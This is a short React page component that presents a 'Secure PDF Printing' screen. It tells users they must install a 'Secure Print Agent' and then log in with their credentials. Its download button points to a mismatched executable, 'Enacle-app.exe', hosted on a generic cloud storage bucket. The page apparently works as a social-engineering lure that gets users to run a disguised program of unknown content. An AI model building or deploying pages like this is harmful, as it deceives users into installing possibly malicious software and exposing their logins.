import { useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Download } from 'lucide-react';
import { Button } from '@/components/ui/button';

const Printing = () => {
  const navigate = useNavigate();

  const handleDownload = () => {
    window.location.href = 'https://storage.railway.app/integrated-pantry-cfpp156/Enacle-app.exe';
  };

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-2xl mx-auto">
        <Button
          variant="ghost"
          onClick={() => navigate(-1)}
          className="mb-6"
        >
          <ArrowLeft className="mr-2 h-4 w-4" />
          Back
        </Button>

        <div className="bg-card p-8 rounded-lg shadow-md border border-border text-center">
          <h1 className="text-2xl font-bold mb-4">Secure PDF Printing</h1>
          <p className="text-muted-foreground mb-6">
            To print your assigned documents securely, you must install the Secure Print Agent.
          </p>
          <p className="text-muted-foreground mb-8">
            Download and install the application below, then log in with your credentials.
          </p>
          <Button onClick={handleDownload} size="lg" className="gap-2">
            <Download className="h-5 w-5" />
            Download Secure Print Agent
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Printing;
